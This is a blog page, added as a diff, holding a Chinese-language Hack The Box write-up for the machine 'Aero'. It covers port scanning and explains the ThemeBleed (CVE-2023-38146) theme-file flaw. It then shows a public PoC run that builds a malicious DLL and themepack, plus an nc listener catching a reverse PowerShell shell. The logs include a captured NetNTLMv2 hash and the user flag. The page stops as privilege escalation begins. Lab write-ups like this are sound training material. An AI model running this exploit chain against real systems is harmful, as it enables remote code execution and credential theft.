@@ -1,0 +1,802 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：WEB审查元素修改、CVE-2023-38146、敏感信息枚举、CVE—2023—28252">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aero-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/24/Aero-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：WEB审查元素修改、CVE-2023-38146、敏感信息枚举、CVE—2023—28252">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aero-htb-writeup/8.png">
+<meta property="article:published_time" content="2024-05-24T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-23T09:40:32.469Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Aero-htb-writeup/1.png">
+  
+  
+  
+  <title>Aero-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Aero-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-24 23:50" pubdate>
+          2024年5月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          106 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Aero-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：WEB审查元素修改、CVE-2023-38146、敏感信息枚举、CVE—2023—28252</p>
+<span id="more"></span>  
+
+<p>参考链接：无</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.237</p>
+<p>2、获取下靶机的开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports1 <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span>   <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-23 18:53 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span><br>Host is up (<span class="hljs-number">0.47</span>s latency).<br>Not shown: <span class="hljs-number">65534</span> filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">15.74</span> seconds<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p80 --min-rate=<span class="hljs-number">10000</span>  <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span> -sC -sV<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-23 18:54 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span><br>Host is up (<span class="hljs-number">0.32</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp open  http    Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|_http-title: Aero Theme Hub<br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">25.04</span> seconds<br>                                                  <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span> -sU <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-23 19:01 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span><br>Host is up (<span class="hljs-number">0.31</span>s latency).<br>All <span class="hljs-number">65535</span> scanned ports on <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span> are in ignored states.<br>Not shown: <span class="hljs-number">65535</span> open|filtered udp ports (no-response)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">16.74</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、看来真的只开放了这一个端口，是场硬战啊，还是2023年的机器也比较新，瞅下80端口</p>
+<p><code>http://10.10.11.237/</code></p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、网页上面有个域名地址，先本地绑定下吧</p>
+<p><code>support@aerohub.htb</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.237 aerohub.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span> aerohub.htb<br></code></pre></td></tr></table></figure>
+
+<p>5、经过分析，发现网站源码上有一行隐藏的注释</p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、把该注释取消掉，网站上面多出来一个功能按钮</p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、经过分析，发现确实这个网站是让上传Windows主题的文件才行，在这里上传您的自定义主题！ </p>
+<p><code>https://learn.microsoft.com/zh-cn/windows/win32/controls/themesfileformat-overview</code></p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、按照打新靶机的套路，直接搜相关的漏洞</p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://www.bleepingcomputer.com/news/security/windows-11-themebleed-rce-bug-gets-proof-of-concept-exploit/</code></p>
+<p><code>https://www.threatdown.com/blog/themebleed-exploit-is-another-reason-to-patch-windows-quickly/</code></p>
+<p><code>https://github.com/exploits-forsale/themebleed</code></p>
+<p><code>https://github.com/Jnnshschl/CVE-2023-38146</code></p>
+<p><code>https://jnns.de/posts/cve-2023-38146-poc/</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">Kirkpatrick 在查看“奇怪的 Windows 文件格式”时发现了该漏洞，其中之一是用于自定义操作系统外观的文件的 .THEME。<br><br>这些文件包含对“.msstyles”文件的引用，这些文件不应包含任何代码，只包含调用它们的主题文件打开时加载的图形资源。<br><br>研究人员注意到，当使用版本号“<span class="hljs-number">999</span>”时，处理 .MSSTYLES 文件的例程在验证 DLL（“_vrf.dll”）签名的时间和库加载的时间之间存在很大差异，从而产生了竞争条件。<br><br>使用特制的 .MSSTYLES，攻击者可以利用竞争窗口将经过验证的 DLL 替换为恶意 DLL，从而允许他们在目标计算机上运行任意代码。<br><br>柯克帕特里克创建了一个 PoC 漏洞，当用户启动主题文件时会打开 Windows 计算器。<br><br>研究人员还指出，从网上下载主题文件会触发“网络标记”警告，这可能会提醒用户存在威胁。但是，如果攻击者将主题包装到 .THEMEPACK 文件（CAB 存档）中，则可以绕过此警告。<br><br>启动 CAB 文件时，包含的主题会自动打开，而不会显示网络标记警告。<br><br>微软通过彻底删除“<span class="hljs-number">999</span> 版”功能解决了这个问题。然而，Kirkpatrick 表示，潜在的竞争条件仍然存在。此外，微软没有解决主题包文件缺少网络标记警告的问题。<br><br>建议 Windows 用户尽快应用微软 <span class="hljs-number">2023</span> 年 <span class="hljs-number">9</span> 月的安全更新包，因为它修复了两个正在被积极利用的零日漏洞，以及各种应用程序和系统组件中的另外 <span class="hljs-number">57</span> 个安全问题。<br></code></pre></td></tr></table></figure>
+
+<p>9、在上面的搜集过程中，还是发现了一个现成的利用工具，直接开始利用吧</p>
+<p><code>https://github.com/Jnnshschl/CVE-2023-38146</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/CVE<span class="hljs-number">-2023</span><span class="hljs-number">-38146</span>]<br>└─$ python3 themebleed.py -r <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span> -p <span class="hljs-number">443</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">116</span> INFO&gt; ThemeBleed CVE<span class="hljs-number">-2023</span><span class="hljs-number">-38146</span> PoC [https:<span class="hljs-comment">//github.com/Jnnshschl]</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">116</span> INFO&gt; Credits to -&gt; https:<span class="hljs-comment">//github.com/gabe-k/themebleed, impacket and cabarchive</span><br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">582</span> INFO&gt; Compiled DLL: <span class="hljs-string">&quot;./tb/Aero.msstyles_vrf_evil.dll&quot;</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">582</span> INFO&gt; Theme generated: <span class="hljs-string">&quot;evil_theme.theme&quot;</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">582</span> INFO&gt; Themepack generated: <span class="hljs-string">&quot;evil_theme.themepack&quot;</span><br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">582</span> INFO&gt; Remember to start netcat: rlwrap -cAr nc -lvnp <span class="hljs-number">443</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">582</span> INFO&gt; Starting SMB server: <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span><br><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">583</span> INFO&gt; Config file parsed<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">583</span> INFO&gt; Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4B</span>324FC8<span class="hljs-number">-1670</span><span class="hljs-number">-01</span>D3<span class="hljs-number">-1278</span><span class="hljs-number">-5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">583</span> INFO&gt; Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6B</span>FFD098-A112<span class="hljs-number">-3610</span><span class="hljs-number">-9833</span><span class="hljs-number">-46</span>C3F87E345A V:<span class="hljs-number">1.0</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">583</span> INFO&gt; Config file parsed<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">59</span>,<span class="hljs-number">583</span> INFO&gt; Config file parsed<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">26</span>,<span class="hljs-number">975</span> INFO&gt; Incoming <span class="hljs-title function_">connection</span> <span class="hljs-params">(<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span>,<span class="hljs-number">57488</span>)</span><br>2024-05-23 20:03:29,285 INFO&gt; <span class="hljs-title function_">AUTHENTICATE_MESSAGE</span> <span class="hljs-params">(AERO\sam.emerson,AERO)</span><br>2024-05-23 20:03:29,285 INFO&gt; User AERO\sam.emerson authenticated successfully<br>2024-05-23 20:03:29,285 INFO&gt; sam.emerson::AERO:aaaaaaaaaaaaaaaa:a59c0827f51cb03abfc707485f9a7e6a:01010000000000000028cb3809adda01c1333edd746bab5600000000010010004e0044006f0079005300490065005300030010004e0044006f0079005300490065005300020010004d00470041004400450078004d006100040010004d00470041004400450078004d006100070008000028cb3809adda0106000400020000000800300030000000000000000000000000200000a1c60778e59e0ea7e694b7d64db502ceb8abf35fcd0e77d8a8f2e56c4922410a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340035000000000000000000<br>2024-05-23 20:03:29,563 INFO&gt; Connecting <span class="hljs-title function_">Share</span><span class="hljs-params">(<span class="hljs-number">1</span>:IPC$)</span><br>2024-05-23 20:03:30,211 INFO&gt; Connecting <span class="hljs-title function_">Share</span><span class="hljs-params">(<span class="hljs-number">2</span>:tb)</span><br>2024-05-23 20:03:31,061 WARNING&gt; Stage 1/3: &quot;Aero.msstyles&quot; [shareAccess: 1]<br>2024-05-23 20:03:34,386 WARNING&gt; Stage 1/3: &quot;Aero.msstyles&quot; [shareAccess: 1]<br>2024-05-23 20:03:41,389 WARNING&gt; Stage 1/3: &quot;Aero.msstyles&quot; [shareAccess: 7]<br>2024-05-23 20:03:42,247 INFO&gt; Disconnecting <span class="hljs-title function_">Share</span><span class="hljs-params">(<span class="hljs-number">1</span>:IPC$)</span><br>2024-05-23 20:03:44,618 WARNING&gt; Stage 1/3: &quot;Aero.msstyles&quot; [shareAccess: 5]<br>2024-05-23 20:03:55,400 WARNING&gt; Stage 2/3: &quot;Aero.msstyles_vrf.dll&quot; [shareAccess: 7]<br>2024-05-23 20:03:57,513 WARNING&gt; Stage 2/3: &quot;Aero.msstyles_vrf.dll&quot; [shareAccess: 1]<br>2024-05-23 20:04:40,562 WARNING&gt; Stage 2/3: &quot;Aero.msstyles_vrf.dll&quot; [shareAccess: 7]<br>2024-05-23 20:04:46,921 WARNING&gt; Stage 3/3: &quot;Aero.msstyles_vrf.dll&quot; [shareAccess: 5]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap -cAr nc -lvnp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span>] <span class="hljs-number">57489</span><br>Windows PowerShell<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> Microsoft Corporation. All rights reserved.<br><br>Install the latest PowerShell <span class="hljs-keyword">for</span> new features and improvements! https:<span class="hljs-comment">//aka.ms/PSWindows</span><br><br>PS C:\Windows\system32&gt; whoami<br>whoami<br>aero\sam.emerson<br>PS C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>
+
+<p>10、这里就获取到初始的shell了，我们直接查看第一个flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Windows\system32&gt; cd C:/Users/sam.emerson/Desktop<br>cd C:/Users/sam.emerson/Desktop<br>PS C:\Users\sam.emerson\Desktop&gt; dir<br>dir<br><br><br>    Directory: C:\Users\sam.emerson\Desktop<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">45</span> PM             <span class="hljs-number">34</span> user.txt                                                             <br><br><br>PS C:\Users\sam.emerson\Desktop&gt; cat user.txt<br>cat user.txt<br>bbba5b00a1cf7964dab9fe678f6526c9<br>PS C:\Users\sam.emerson\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>11、经过各种手工枚举，发现在当前用户下有一个PDF文件和一个脚本文件</p>
